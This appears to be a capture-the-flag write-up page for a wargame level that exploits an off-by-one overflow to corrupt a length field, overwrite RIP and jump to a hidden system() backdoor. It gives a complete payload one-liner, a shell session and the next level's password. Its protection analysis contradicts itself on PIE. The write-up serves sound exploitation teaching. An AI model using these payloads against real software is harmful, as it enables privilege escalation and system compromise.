---
sidebar_position: 11
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🎯 Level 09

<MissionObjective 
  level="Level 09"
  target="end privileges"
  method="Off-by-one overflow with structure manipulation"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Off-by-One Buffer Overflow with Structure Corruption"
  severity="critical"
  description="Binary contains an off-by-one overflow in username input that corrupts a length field, enabling controlled buffer overflow into RIP. A hidden secret_backdoor() function provides direct system() access."
  techniques={[
    "Off-by-One Overflow",
    "Structure Manipulation", 
    "RIP Overwrite",
    "Hidden Function Discovery"
  ]}
/>

## Program Behavior Analysis

<CodeBlock 
  title="Binary Interaction Flow"
  command="./level09"
  output={`--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: testuser
>: Welcome, testuser
>: Msg @Unix-Dude
>>: Hello world
>: Msg sent!`}
/>

**Input Processing:**
1. **Username**: Read with custom character-by-character copy
2. **Message**: Read with `fgets()` and copied via `strncpy()`
3. **Storage**: Both stored in structured memory layout

## Data Structure Analysis

<CodeBlock 
  title="Memory Structure Layout"
  command="# Structure definition"
  output={`typedef struct s_message {
    char text[140];     // buffer for the message  
    char username[40];  // buffer for the username
    int len;            // initialized to 140
} t_message;

Memory layout:
[text: 140 bytes][username: 40 bytes][len: 4 bytes]
                                      ^^^^^^^^^^^^
                                   Corruption target`}
/>

## Vulnerability Discovery

<CodeBlock 
  title="Critical Functions Analysis"
  command="# Function behavior analysis"
  output={`set_username():
- Copies characters one by one into username[40]
- COPIES 41 CHARACTERS instead of 40!
- Last character overwrites LSB of len field

set_msg():
- Uses strncpy(msg->text, buffer, msg->len)
- Length parameter controlled by corrupted len value
- Can copy more than 140 bytes into text buffer`}
/>

## Off-by-One Overflow Mechanics

<CodeBlock 
  title="Length Field Corruption"
  command="# How the overflow works"
  output={`Normal state:
len = 0x0000008c (140 decimal)

After 41-character username with 0xd4:
len = 0x000000d4 (212 decimal)

Impact:
strncpy() now copies 212 bytes instead of 140
= 72 byte overflow beyond text buffer`}
/>

## Hidden Function Discovery

<CodeBlock 
  title="Secret Backdoor Function"
  command="(gdb) disas secret_backdoor"
  output={`0x000055555555488c <secret_backdoor>:
   push   %rbp
   mov    %rsp,%rbp
   ...
   fgets(buf, 128, stdin)    ; Read command from stdin
   ...
   system(buf)               ; Execute command directly!
   ...`}
/>

**Backdoor Functionality:**
- Reads command from stdin (128 bytes max)
- Passes input directly to `system()` call
- Perfect target for RIP hijacking

## Exploitation Strategy

<StepsList
  title="Multi-Stage Buffer Overflow"
  steps={[
    {
      title: "Corrupt Length Field",
      description: "Use off-by-one overflow to increase strncpy() length",
      command: "'A' * 40 + '\\xd4'",
      result: "len becomes 212 instead of 140"
    },
    {
      title: "Calculate RIP Offset",
      description: "Determine how many bytes needed to reach saved RIP",
      command: "text[140] + padding = 200 bytes to RIP",
      result: "RIP overwrite position identified"
    },
    {
      title: "Target Hidden Function",
      description: "Redirect execution to secret_backdoor()",
      command: "RIP = 0x000055555555488c",
      result: "Execution redirected to backdoor"
    },
    {
      title: "Provide Shell Command",
      description: "Input /bin/sh when backdoor reads from stdin",
      command: "system(\"/bin/sh\")",
      result: "Shell spawned with elevated privileges"
    }
  ]}
/>

## Memory Layout Analysis

<CodeBlock 
  title="Stack Layout During Overflow"
  command="# Buffer overflow progression"
  output={`Stack layout (simplified):
[text: 140 bytes    ]  <- strncpy destination
[username: 40 bytes ]  <- off-by-one source  
[len: 4 bytes      ]  <- corrupted by overflow
[... other data    ]
[saved RIP         ]  <- final target (offset +200)

Overflow chain:
1. username[40] -> len corruption
2. strncpy(text, msg, corrupted_len)
3. text overflow -> RIP overwrite`}
/>

## Payload Construction

<CodeBlock 
  title="Exploit Payload Assembly"
  command="# Stage 1: Username with length corruption"
  output={`Username: 'B' * 40 + '\\xd4' + '\\n'
- 40 B's fill username buffer
- \\xd4 overwrites len LSB (140 -> 212)
- \\n terminates username input`}
/>

<CodeBlock 
  title="Stage 2: Message with RIP overwrite"
  command="# Message payload structure"
  output={`Message: 'B' * 200 + secret_backdoor_addr + '/bin/sh'

Components:
- 'B' * 200: Fill text buffer + reach RIP
- secret_backdoor_addr: 0x000055555555488c (little-endian)
- '/bin/sh': Command for system() call`}
/>

## Address Resolution

<CodeBlock 
  title="Finding secret_backdoor Address"
  command="(gdb) p secret_backdoor"
  output={`$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

Little-endian representation:
0x000055555555488c -> \\x8c\\x48\\x55\\x55\\x55\\x55\\x00\\x00`}
/>

## Complete Exploit

<CodeBlock 
  title="Final Payload Generation"
  command='python -c "print \\"B\\"*40 + \\"\\xd4\\" + \\"\\n\\" + \\"B\\"*200 + \\"\\x8c\\x48\\x55\\x55\\x55\\x55\\x00\\x00\\" + \\"/bin/sh\\"" > /tmp/exploit'
  output={`Payload breakdown:
- Username: 40 B's + \\xd4 corruption
- Message: 200 B's + RIP overwrite + shell command
Total: Precisely crafted for RIP hijacking`}
/>

## Successful Exploitation

<CodeBlock 
  title="Exploit Execution"
  command="cat /tmp/exploit - | ./level09"
  output={`--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�
>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
$ whoami
end
$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`}
/>


## Live Demonstration

<AsciinemaPlayer 
  src="https://asciinema.org/a/2HaH3TuJ86PNmDWDeVzr0XcSi.js" 
  id="asciicast-2HaH3TuJ86PNmDWDeVzr0XcSi" 
/>



## Technical Deep Dive

### Off-by-One Vulnerability Analysis

:::tip **Off-by-One Mechanics**
- **Boundary Error**: Loop copies 41 chars instead of 40
- **Adjacent Corruption**: Overwrites next structure member
- **Amplification**: Small overflow enables larger overflow
- **Control Flow**: Indirect control through data corruption
:::

### Structure Manipulation

<CodeBlock 
  title="Memory Corruption Chain"
  command="# How one byte leads to code execution"
  output={`1. username[40] -> len corruption (1 byte)
2. len controls strncpy() size parameter  
3. Enlarged strncpy() -> text buffer overflow
4. Buffer overflow -> RIP overwrite
5. RIP redirect -> secret_backdoor()
6. Backdoor function -> system() call
7. Controlled system() -> shell access`}
/>

## Alternative Exploitation Paths

<CodeBlock 
  title="Other Potential Targets"
  command="# If secret_backdoor wasn't available"
  output={`1. ret2libc: Redirect to system() + "/bin/sh"
2. ROP chains: Build execution chain
3. Shellcode injection: If stack executable
4. GOT overwrite: Hijack function pointers

secret_backdoor() is optimal target:
- No ASLR bypass needed
- Direct system() access
- Controlled input handling`}
/>

## Debugging Tips

<CodeBlock 
  title="GDB Analysis Commands"
  command="# Useful debugging commands"
  output={`(gdb) x/40wx $rsp-200     # Examine stack layout
(gdb) info functions secret   # Find hidden functions  
(gdb) x/i 0x55555555488c     # Disassemble backdoor
(gdb) pattern create 300     # Generate unique pattern
(gdb) pattern offset 0x6261  # Find RIP offset`}
/>

## Key Learning Points

:::warning **Advanced Concepts**
- **Structure Layout**: Understanding memory organization
- **Off-by-One Impact**: How small overflows enable larger ones
- **Hidden Functions**: Static analysis for backdoors
- **Multi-Stage Exploitation**: Chaining vulnerabilities
:::

## Protection Bypass Analysis

<CodeBlock 
  title="Modern Protection Evasion"
  command="# Why this exploit works"
  output={`Stack Canaries: Not implemented
ASLR: Disabled or predictable addresses
NX/DEP: Avoided by using existing code
PIE: Not enabled, fixed addresses

Technique advantages:
- No shellcode injection needed
- Uses existing executable code
- Minimal ASLR interaction required`}
/>

## Technical Summary

This level demonstrates:
1. **Off-by-One Exploitation** - Small overflows with large impact
2. **Structure Manipulation** - Corrupting adjacent data fields
3. **Multi-Stage Attacks** - Chaining multiple vulnerabilities
4. **Hidden Function Analysis** - Discovering backdoors through static analysis
5. **Advanced RIP Control** - Precise execution redirection

The vulnerability showcases how seemingly minor boundary errors can cascade into complete system compromise through careful structure manipulation and hidden function discovery. This represents the culmination of buffer overflow techniques with modern exploit